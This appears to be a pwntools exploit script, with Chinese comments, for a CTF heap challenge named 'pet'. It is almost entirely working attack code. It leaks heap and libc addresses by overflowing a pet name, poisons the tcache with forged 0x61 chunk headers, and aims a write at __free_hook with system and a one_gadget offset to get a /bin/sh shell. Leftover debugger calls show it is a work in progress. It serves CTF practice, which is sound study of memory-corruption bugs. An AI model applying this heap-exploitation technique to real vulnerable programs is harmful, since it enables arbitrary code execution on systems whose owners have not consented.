#远程版本是2.27+，原因：测试了下发现远程有tcache
from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 

p=process('./pet-copy')
# p=remote('t.ctf.qwq.cc',49619)
# elf=ELF('./pet')
# libc=ELF('./libc.so.6')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')
# p=gdb.debug(['/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6', './pet-copy'], env={'LD_PRELOAD': '/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/ld-2.31.so '})
def add():
    p.recvuntil(b'> ')
    p.sendline(b'1')
def edit(idx,name):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(str(idx).encode())
    p.send(name)
def show(idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'> ')
    p.sendline(str(idx).encode())
def free(idx):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'> ')
    p.sendline(str(idx).encode())
def comment(comment):
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'comment ^-^\n')
    p.sendline(comment)
# p.interactive()
# pause()
add()

# comment(p64(0)*2+p8(0))
add()
add()
# free(0)
# gdb.attach(p)
free(1)
gdb.attach(p)

# gdb.attach(p)
edit(0,b'a'*0x40)
show(0)
p.recvuntil(b'a'*0x40)
getaddr=u64(p.recv(6).ljust(8,b'\x00')) #堆地址
print('getaddr:',hex(getaddr))
edit(0,p64(0)*6+p64(0x61)+p64(0))
add()
free(2)
free(1)
edit(0,p64(0)*6+p64(0x61)+p64(getaddr+0x800))
# gdb.attach(p)

add()
add()
edit(2,b'a'*0x50)

# gdb.attach(p)
show(2)
p.recvuntil(b'a'*0x50)
libcaddr=u64(p.recv(6).ljust(8,b'\x00')) #libc地址
print('libcaddr:',hex(libcaddr))
libcbase=libcaddr-libc.sym['_IO_file_jumps']
print('libcbase:',hex(libcbase))
free_hook=libcbase+libc.sym['__free_hook']
print('free_hook:',hex(free_hook))
one_gadget=libcbase+0xe3b04
system_addr=libcbase+libc.sym['system']
edit(2,b'\x00'*0x50)

# gdb.attach(p)

edit(0,p64(0)*6+p64(0x61)+p64(free_hook-0x20))
free(0)
free(1)
add()
add()
# free(2)
gdb.attach(p)
comment(b'a')
add()
add()
comment(b'/bin/sh\x00')
pause()
add()

# 0x000055b5a16a9a50
# 0x000055feb04205e0